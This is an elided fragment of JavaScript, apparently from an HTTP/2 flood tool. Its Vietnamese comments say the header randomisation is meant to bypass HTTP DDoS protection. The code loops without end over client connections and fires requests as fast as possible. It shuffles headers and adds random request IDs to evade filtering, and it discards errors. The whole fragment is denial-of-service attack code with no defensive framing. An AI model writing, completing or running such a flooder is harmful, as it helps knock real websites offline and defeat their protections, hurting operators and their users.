...
const updateWindow = Buffer.alloc(4);
    ...
    clients.forEach(client => {
      ...
      const headers2 = (currenthead) => {
            ...
            while (true) {
                // Random hóa headers để bypass HTTP DDoS
                const randomizedHeaders = shuffleObject({
                    ...headers,
                    'x-request-id': randstr(10, 20), // Thêm header ngẫu nhiên
                ...
                const request = client.request(randomizedHeaders, { endStream: true });
                request.on('response', () => request.close(http2.constants.NO_ERROR));
                request.on('error', () => {});
                request.end();
                await new Promise(resolve => setImmediate(resolve)); // Gửi request ngay lập tức
            }
        };
